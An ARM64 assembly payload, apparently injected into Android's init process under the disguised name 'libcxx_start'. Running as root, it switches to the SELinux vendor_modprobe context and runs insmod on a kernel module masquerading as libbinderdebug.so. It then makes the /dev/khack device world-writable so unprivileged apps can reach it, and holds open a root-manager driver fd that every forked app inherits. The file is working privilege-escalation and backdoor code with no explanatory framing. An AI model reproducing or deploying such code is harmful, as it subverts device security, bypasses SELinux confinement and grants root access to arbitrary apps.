    .arch armv8-a

    .include "include.inc"

    .equ SYS_nanosleep, 101
    .equ SYS_fchmodat, 53

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data


libcxx_data:

attr_exec:
    .asciz "/proc/self/attr/exec"
selinux_ctx:
    .asciz "u:r:vendor_modprobe:s0"
selinux_ctx_end:
exe_path:
    .asciz "/vendor/bin/insmod"
enforce_path:
    .asciz "/sys/fs/selinux/enforce"
zero_str:
    .asciz "0"
/* errno template: byte 7 is overwritten with -execve's return value */
/* exit-status template: byte 7 is overwritten with insmod's exit code */
khack_dev:
    .asciz "/dev/khack"
khack2_dev:
    .asciz "/dev/khack2"
ko_target:
    .ascii "/vendor/lib64/libbinderdebug.so\0"
    .skip 32, 0                             /* pad to 64 bytes - longest candidate path */
    .balign 4
    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int ko_target - libcxx_data

    .align 4

libcxx_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // uid == 0 and tid == 1: only init's main thread, only as root.
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return




    // argv frame: [0]=argv0 [8]=argv1 [16]=NULL
    sub     sp, sp, 32

    // Keep a [ksu_driver] anon_inode fd open in init: zygote (and every app
    // forked from it) inherits it, which is what the manager scans for.
    mov     x0, -100
    adr     x1, khack2_dev
    mov     x2, #0
    mov     x3, #0
    mov     x8, #SYS_openat
    svc     0
    tbnz    w0, #31, 6f
    mov     x9, x0
    mov     x0, x9
    mov     x1, #0x4b00
    mov     x2, #0
    mov     x8, #29                 // ioctl
    svc     0
    mov     x0, x9
    mov     x8, #SYS_close
    svc     0
6:
    // Fork exactly once: the child becomes vendor_modprobe and runs insmod.
    // No worker, no wait, no pipe -- every one of those hung on this ROM.
    mov     x0, #SIGCHLD
    mov     x1, xzr
    mov     x2, xzr
    mov     x3, xzr
    mov     x4, xzr
    mov     x8, #SYS_clone
    svc     0
    cbz     w0, L_child

    add     sp, sp, 32
    b       return                  // init resumes immediately

L_child:
    // Second child: ueventd ignores miscdevice .mode, so the node lands as
    // 0600 root. Wait for the module and relax it to 0666 from the init
    // domain, otherwise no unprivileged process can even reach the gate.
    mov     x0, #SIGCHLD
    mov     x1, xzr
    mov     x2, xzr
    mov     x3, xzr
    mov     x4, xzr
    mov     x8, #SYS_clone
    svc     0
    cbz     w0, L_chmod

    // setexeccon(u:r:vendor_modprobe:s0) - takes effect on the next exec
    mov     x0, -100
    adr     x1, attr_exec
    movl    x2, (O_WRONLY|O_CLOEXEC)
    mov     x8, #SYS_openat
    svc     0
    tbnz    w0, #31, L_ctx_fail
    mov     x9, x0
    mov     x0, x9
    adr     x1, selinux_ctx
    mov     x2, selinux_ctx_end - selinux_ctx
    mov     x8, #SYS_write
    svc     0
    tbnz    w0, #31, L_ctx_fail


    // execve("/vendor/bin/insmod", ["/vendor/bin/insmod", ko_target, NULL], NULL)
    // execve("/vendor/bin/insmod", ["/vendor/bin/insmod", ko_target, NULL], NULL)
    adr     x1, exe_path
    str     x1, [sp]
    adr     x1, ko_target
    str     x1, [sp, 8]
    str     xzr, [sp, 16]
    adr     x0, exe_path
    mov     x1, sp
    mov     x2, xzr
    mov     x8, #SYS_execve
    svc     0

    // execve returned: nothing to report, just leave.
    b       L_exit

L_chmod:
    mov     x19, #30
L_chmod_try:
    mov     x0, -100
    adr     x1, khack_dev
    mov     x2, #438
    mov     x3, xzr
    mov     x8, #SYS_fchmodat
    svc     0
    cbz     w0, L_exit
    sub     sp, sp, #16
    stp     xzr, xzr, [sp]
    movz    x9, #0xBC20
    movk    x9, #0x0BEB, lsl #16
    str     x9, [sp, #8]
    mov     x0, sp
    mov     x1, xzr
    mov     x8, #SYS_nanosleep
    svc     0
    add     sp, sp, #16
    subs    x19, x19, #1
    bne     L_chmod_try
    b       L_exit

L_ctx_fail:

L_exit:
    mov     x0, #1
    mov     x8, #SYS_exit
    svc     0

return:
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
libcxx_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
